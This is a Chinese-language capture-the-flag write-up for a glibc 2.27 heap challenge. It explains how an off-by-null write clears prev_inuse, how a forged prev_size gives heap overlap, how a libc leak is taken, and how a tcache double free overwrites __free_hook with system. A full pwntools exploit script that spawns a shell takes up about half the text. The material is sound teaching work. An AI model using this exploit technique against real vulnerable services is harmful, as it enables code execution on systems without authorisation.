# 你满了,那我就漫出来了!

## 题目简述

题目的 `add` 在用户填满所申请长度时仍会追加字符串终止符，形成 off-by-null：恰好多写出的一个 `\x00` 会清除下一个 chunk `size` 字段最低字节中的 `prev_inuse` 位。目标环境使用 glibc 2.27，可以结合伪造 `prev_size`、向后合并制造 heap overlap，进而得到指向同一 chunk 的两个索引，完成 double free 与 tcache poisoning。

## 解题过程

### off-by-null 制造重叠

先布置相邻的 `0xf8`、`0x68`、`0xf8` 请求，并用额外 chunk 防止与 top chunk 意外合并。释放若干 `0xf8` chunk 填满 `0x100` tcache 后，再释放索引 0，使其进入 unsorted bin；释放索引 1 后重新申请 `0x68`，写入 0x60 字节填充与伪造的 `prev_size=0x170`。

由于 `add` 末尾额外写入空字节，下一个 chunk 的 `prev_inuse` 被清零。此时释放索引 2，glibc 会按照伪造的 `prev_size` 向前寻找 chunk，并把原本独立的区域合并。之后分别从合并区域与原有缓存取出 `0x78` chunk，即可形成 overlap。

### 泄露 libc 并 double free

重叠后，`show(1)` 能读到 unsorted-bin 指针。题目 libc 中对应关系为：

```python
libc_base = leak - libc.sym["__malloc_hook"] - 0x10 - 0x60
```

接着申请并释放一组 `0x68` chunk，把 `0x70` tcache 填满；按官方顺序释放重叠的索引 3、12、1，再取空 tcache，便可绕过直接重复释放检查并让同一地址再次进入链表。把 freelist 下一项改为 `__free_hook`，后续分配即可在 hook 上写入 `system`。

### 完整利用

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

io = process("./vuln")
# io = remote("host", port)
elf = ELF("./vuln")
libc = ELF("./libc-2.27.so")


def add(index, size, content):
    io.sendlineafter(b"Your choice:", b"1")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Content: ", content)


def show(index):
    io.sendlineafter(b"Your choice:", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())


def delete(index):
    io.sendlineafter(b"Your choice:", b"3")
    io.sendlineafter(b"Index: ", str(index).encode())


add(0, 0xF8, b"A")
add(1, 0x68, b"A")
for index in range(2, 10):
    add(index, 0xF8, b"A")
add(12, 0x68, b"A")

# 填满 0x100 tcache，让索引 0 进入 unsorted bin。
for index in range(3, 10):
    delete(index)
delete(0)
delete(1)

# 写入伪造 prev_size，并由字符串末尾的 NUL 清掉 chunk 2 的 prev_inuse。
add(1, 0x68, b"A" * 0x60 + p64(0x170))
delete(2)

# 从重叠区域取得两个指向关联内存的 chunk。
add(0, 0x78, b"A")
add(2, 0x78, b"A")
show(1)

leak = u64(io.recv(6).ljust(8, b"\x00"))
libc_base = leak - libc.sym["__malloc_hook"] - 0x10 - 0x60
free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]
log.success(f"libc base: {libc_base:#x}")

# 准备并填满 0x70 tcache。
add(3, 0x68, b"A")
for index in range(4, 11):
    add(index, 0x68, b"A")
for index in range(4, 11):
    delete(index)

# 借助重叠指针形成 double free，再把 tcache next 改为 __free_hook。
delete(3)
delete(12)
delete(1)
for index in range(4, 11):
    add(index, 0x68, b"A")

add(1, 0x68, p64(free_hook))
add(3, 0x68, b"/bin/sh\x00")
add(13, 0x68, b"/bin/sh\x00")
add(12, 0x68, p64(system))
delete(3)

io.interactive()
```

释放索引 3 时实际执行 `system("/bin/sh")`，获得 shell。官方 PDF 未记录最终 flag 字符串。

## 方法总结

- off-by-null 的价值不在于写任意数据，而在于精确清除相邻 chunk 的 `prev_inuse`，使释放路径相信前方存在空闲块。
- 伪造的 `prev_size` 必须与预期向后合并距离一致；本题为 `0x170`。
- heap overlap 提供两个仍可操作的别名指针，再配合填满/取空 tcache 的顺序构造 double free。
- `__free_hook` 利用依赖旧版 glibc；换到移除 malloc hooks 的新版本时，需要改用其他控制流劫持目标。
